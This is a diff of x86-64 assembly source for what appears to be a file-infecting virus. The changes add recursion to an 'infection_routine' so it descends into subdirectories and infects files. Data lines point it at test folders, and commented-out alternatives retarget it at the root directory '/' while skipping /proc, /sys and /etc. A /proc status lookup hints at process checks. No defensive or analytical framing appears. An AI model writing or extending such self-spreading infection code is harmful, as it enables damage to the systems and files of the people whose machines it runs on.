@@ -209,9 +209,9 @@ infection_routine:
     mov r9, rax
 
     test rax, rax
-    js exit_err
+    js .ret
 
-    call write_string_nl
+    ; call write_string_nl
 
 .file_loop_start_infection:
     sub rsp, DIRENT_BUF_SZ
@@ -227,7 +227,6 @@ infection_routine:
 
     mov rcx, 0
 
-; TODO: copy dirent_read_loop_start_evasion here
 .dirent_read_loop_start_infection:
     cmp rcx, rax
     jge .dirent_read_loop_end_infection
@@ -239,6 +238,17 @@ infection_routine:
     call strlen
 
     sub rsp, BLAZEIT
+    ; zero out the bytes from rsp here
+    push rcx
+    xor ecx, ecx
+.zloop:
+    mov byte [rsp + 8 + rcx], 0   ; +8 skips the saved rcx
+    inc ecx
+    cmp ecx, BLAZEIT
+    jb .zloop
+    pop rcx
+
+
     mov rsi, r8
     mov rdi, rsp
     mov rdx, rax
@@ -253,12 +263,28 @@ infection_routine:
     mov rdi, rax
     call strcpy
 
+	; TODO: /bin/ doesnt work when system root
     ; check if dirent.d_name is bad (./ and ../)
     lea rdi, [rbx + rcx + dirent.d_name]
     lea rsi, [rel excl_dir]
     call strstrs
     test rax, rax
     jnz .dirent_read_loop_start_infection_end
+
+    ; check dirent.d_type. If DT_DIR, recurse infection_routine with the name as input
+    ; if DT_REG, run infection on singele file 
+    mov ah, [rbx + rcx + dirent.d_type]
+    cmp ah, DT_DIR
+    jne .skip_recurse
+    lea rdi, [rsp]
+    call infection_routine
+
+
+.skip_recurse:
+    ; lea rdi, [rbx + rcx]
+    ; mov rdi, [rdi + rax - 1]
+
+
 
     ; print stuff
     lea rdi, [rsp]
@@ -484,7 +510,13 @@ null db 0
 
 ; TODO: change this to root 
 root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
+; root_dirs db `/`,0,0
+
 excl_dir db `.`, 0, `..`, 0, 0
+; excl_dir db `.`, 0, `..`, 0, `etc`, 0, `proc`, 0, `sys`, 0, 0
+; excl_dir db `.`, 0, `..`, 0, `home`, 0, `proc`, 0, `sys`, 0, `usr`, 0, 0
+
+
 
 proc_dir db `/proc/`,0
 proc_status db `/status`, 0
